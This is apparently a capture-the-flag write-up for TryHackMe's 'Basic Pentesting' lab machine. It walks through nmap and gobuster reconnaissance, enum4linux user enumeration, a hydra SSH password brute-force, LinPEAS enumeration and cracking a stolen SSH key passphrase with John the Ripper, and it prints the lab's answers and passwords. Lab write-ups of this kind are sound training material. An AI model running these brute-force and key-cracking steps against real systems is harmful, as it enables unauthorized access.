# Basic Pentesting

This walkthrough is for the [Basic Pentesting room](https://tryhackme.com/room/basicpentestingjt) from TryHackMe.

-----------------------------------------------------------------------------------------------------------------------------------------------
### Web App Testing and Privilge Escalation
-----------------------------------------------------------------------------------------------------------------------------------------------

1. Deploy the machine and connect to our network.

   Machine IP:  10.10.152.19
----------------------------------------------------------------------------------------------------------------------------------------------
2. Find the services exposed by the machine.

   For this, I used nmap (Command: `nmap -sC -sV -oN 10.10.152.19 `). 

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13?
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http-proxy
| fingerprint-strings: 
|   NCP, NotesRPC: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 2243
|     Date: Tue, 16 Jun 2020 12:35:25 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|_    Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><bod
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=6/16%Time=5EE8BC8C%P=x86_64-pc-linux-gnu%r(NC
SF:P,95F,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=utf-8
SF:\r\nContent-Language:\x20en\r\nContent-Length:\x202243\r\nDate:\x20Tue,
SF:\x2016\x20Jun\x202020\x2012:35:25\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20
SF:400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/css\
SF:">h1\x20{font-family:Tahoma,Arial,sans-serif;color:white;background-col
SF:or:#525D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-ser
SF:if;color:white;background-color:#525D76;font-size:16px;}\x20h3\x20{font
SF:-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;fo
SF:nt-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color:bl
SF:ack;background-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-ser
SF:if;color:white;background-color:#525D76;}\x20p\x20{font-family:Tahoma,A
SF:rial,sans-serif;background:white;color:black;font-size:12px;}\x20a\x20{
SF:color:black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px;bac
SF:kground-color:#525D76;border:none;}</style></head><bod")%r(NotesRPC,95F
SF:,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nC
SF:ontent-Language:\x20en\r\nContent-Length:\x202243\r\nDate:\x20Tue,\x201
SF:6\x20Jun\x202020\x2012:35:25\x20GMT\r\nConnection:\x20close\r\n\r\n<!do
SF:ctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x
SF:20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/css\">h1\
SF:x20{font-family:Tahoma,Arial,sans-serif;color:white;background-color:#5
SF:25D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-serif;co
SF:lor:white;background-color:#525D76;font-size:16px;}\x20h3\x20{font-fami
SF:ly:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-si
SF:ze:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color:black;b
SF:ackground-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-serif;co
SF:lor:white;background-color:#525D76;}\x20p\x20{font-family:Tahoma,Arial,
SF:sans-serif;background:white;color:black;font-size:12px;}\x20a\x20{color
SF::black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px;backgrou
SF:nd-color:#525D76;border:none;}</style></head><bod");
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2020-06-16T08:35:29-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-16T12:35:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 168.43 seconds


-----------------------------------------------------------------------------------------------------------------------------------------------------
3. What is the name of the hidden directory on the web server(enter name without /)?

   To find hidden directories, I used gobuster (`gobuster dir -u http:// 10.10.152.19/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`). After letting it run for a while, it gave me the hidden directory I was looking for.

  ===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://basicpentesting.com
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/16 08:40:01 Starting gobuster
===============================================================
/development (Status: 301)

   > development
---------------------------------------------------------------------------------------------------------------------------------------------------
4. User brute-forcing to find the username & password

   For this part, I used enum4linux. It comes preinstalled on Kali Linux. Command: `enum4linux -a 10.10.152.19` (the -a flag for all simple enumeration; check `enum4linux -h` for more information on the options).

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

 
------------------------------------------------------------------------------------------------------------------------------------------------------
5. What is the username

   > jan
--------------------------------------------------------------------------------------------------------------------------------------------------------
6. What is the password?

   To find the password, I used hydra (`hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.152.19`), knowing the username (*jan*) for the SSH service (*port 22*).
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-16 09:45:50
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 128212 login tries (l:1/p:128212), ~8014 tries per task
[DATA] attacking ssh://basicpentesting.com:22/
[STATUS] 179.00 tries/min, 179 tries in 00:01h, 128036 to do in 11:56h, 16 active
[STATUS] 113.00 tries/min, 339 tries in 00:03h, 127876 to do in 18:52h, 16 active
[STATUS] 110.43 tries/min, 773 tries in 00:07h, 127442 to do in 19:15h, 16 active
[22][ssh] host: 10.10.152.19   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.                                                                    
[ERROR] 3 targets did not resolve or could not be connected                                                                                                  
[ERROR] 0 targets did not complete                                                                                                                           
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-16 09:53:52
   

   > armando
------------------------------------------------------------------------------------------------------------------------------------------------------------
7. What service do you use to access the server(answer in abbreviation in all caps)?

   > SSH

Now that we have the username and corresponding password for *jan*, I can log into the machine using SSH. (`ssh jan@10.10.37.123`)
----------------------------------------------------------------------------------------------------------------------------------------------------------------
8. Enumerate the machine to find any vectors for privilege escalation

For this, I used Privilege Escalation Awesome Script or PEAS. I uploaded the linpeas.sh file to the server (scp linpeas.sh jan@10.10.37.123:/tmp, with jan's password) and ran the script.

-------------------------------------------------------------------------------------------------------------------------------------------------------------------
9. What is the name of the other user you found(all lower case)?

   See question 4.

   > kay
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
10. If you have found another user, what can you do with this information?

    Using LinPEAS, one of the vectors for privesc that was found was kay's rsa private key, which can be used to access the machine using SSH.


------------------------------------------------------------------------------------------------------------------------------------------------------------------------
11. What is the final password you obtain?

   Since we found kay's rsa private key, I attempted to use this file to log into the machine as kay. The attempt asked for a passphrase, which, with the help of johntheripper, I found.

   Commands to obtain passphrase:
   * `ssh2john.py kay_id_rsa > forjohn.txt`
   * `john forjohn.txt --wordlist=/usr/share/worlists/rockyou.txt`


   After obtaining the passphrase, I was able to log in as kay using ssh (`ssh -i kay_id_rsa kay@10.10.37.123`) and read the file kay had in their home directory (*pass.bak*)

   > heresareallystrongpasswordthatfollowsthepasswordpolicy$$
